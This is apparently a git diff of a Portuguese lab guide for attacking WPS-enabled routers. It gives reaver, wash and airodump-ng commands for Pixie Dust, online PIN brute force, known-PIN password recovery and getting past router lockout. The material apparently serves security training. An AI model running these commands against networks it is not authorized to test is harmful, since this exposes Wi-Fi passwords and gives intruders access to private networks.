@@ -12,7 +12,7 @@
 |-------|-----------|
 | **Autor** | Robson Vaamonde |
 | **Data de criação** | 22/07/2026 |
-| **Data de atualização** | 19/08/2026 |
+| **Data de atualização** | 20/08/2026 |
 | **Versão** | 0.03 |
 | **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
 ---
@@ -142,7 +142,7 @@ sudo wash -i wlan1 -s
 # opção do comando airodump-ng: --wps (Display a WPS column with WPS version, config method(s))
 sudo airodump-ng --wps wlan1
 
-# Filtrando i Access Point com suporte ao WPS (QSS) com base no BSSID
+# Filtrando o Access Point com suporte ao WPS (QSS) com base no BSSID
 # opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only show 
 # networks, matching the given bssid),--wps (Display a WPS column with WPS version, config method(s))
 sudo airodump-ng -c <CANAL> -bssid <BSSID_DO_AP_WPS> --wps wlan1
@@ -166,7 +166,13 @@ Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o 
 ### 🔧 Procedimento — Método Tradicional
 
 ```bash
-# Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado
+# Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado (MODO OFFLINE - RÁPIDO)
+# opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
+# -c (Set the 802.11 channel for the interface), -K (Run pixiedust attack), -vv (Display non-critical 
+# warnings for more)
+sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -K -vv
+
+# Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado (MODO ONLINE - LENTO)
 # opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
 # -c (Set the 802.11 channel for the interface), -vv (Display non-critical warnings for more)
 sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -vv
@@ -180,7 +186,7 @@ sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -vv
 | `-vv` | Modo *verbose* — exibe o progresso detalhado em tempo real. |
 ---
 
-> **OBSERVAÇÃO IMPORTANTE:** Expectativa de tempo: o ataque online completo pode levar de `2 a 10+ horas`, já que testa até `~11.000 combinações reais` contra o roteador (bem diferente do Pixie Dust, que é quase instantâneo quando funciona).
+> **OBSERVAÇÃO IMPORTANTE:** Expectativa de tempo: o **ataque online** completo pode levar de `2 a 10+ horas`, já que testa até `~11.000 combinações reais` contra o roteador (bem diferente do Pixie Dust, que é quase instantâneo quando funciona).
 
 ### ✅ Resultado Esperado
 
@@ -192,9 +198,7 @@ sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -vv
 
 # 05 - Ataque de PIN Conhecido com Reaver 
 
-Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o ataque de PIN conhecido para descobrir a senha WPA/WPA2.
-
-### 🔧 Procedimento — Método Tradicional
+Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o ataque de PIN conhecido para descobrir a senha `WPA/WPA2`.
 
 ```bash
 # Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado
@@ -213,14 +217,14 @@ sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -p <NÚMERO_DO_PIN> -vv
 | `-vv` | Modo *verbose* — exibe o progresso detalhado em tempo real. |
 ---
 
-> **OBSERVAÇÃO IMPORTANTE:** Com o número do PIN conhecido o ataque de descoberta de senha e quase instantâneo em roteadores vulnerável.
+> **OBSERVAÇÃO IMPORTANTE:** Com o número do PIN conhecido o ataque de descoberta de senha e quase `instantâneo em roteadores vulnerável`.
 
 ### ✅ Resultado Esperado
 
 | Situação | Ação |
 |---|---|
 | ✅ `WPS PIN: 'XXXXXXXX'` / `WPA PSK: 'senha'` | Ataque bem-sucedido — anotar PIN e senha no relatório do grupo. |
-| ❌ `WPS transaction failed` repetidas vezes | O chipset pode não ser vulnerável ao Pixie Dust — seguir para o método tradicional com pausa (`-d`), abaixo. |
+| ❌ `WPS transaction failed` repetidas vezes | O chipset pode não ser vulnerável ao `Pixie Dust` — seguir para o método tradicional com pausa (`-d`), abaixo. |
 ---
 
 ## 06 - Contornando o Lockout do Roteador (quando `Locked = Sim`)
@@ -233,7 +237,7 @@ sudo reaver -i wlan1 -b <BSSID_DO_AP> -K 1 -d 302 -vv
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `-d 302` | Insere uma pausa de 302 milissegundos entre as tentativas de PIN, evitando disparar o mecanismo de proteção (*lockout*) do roteador. Método mais demorado, porém mais estável. |
 ---
 
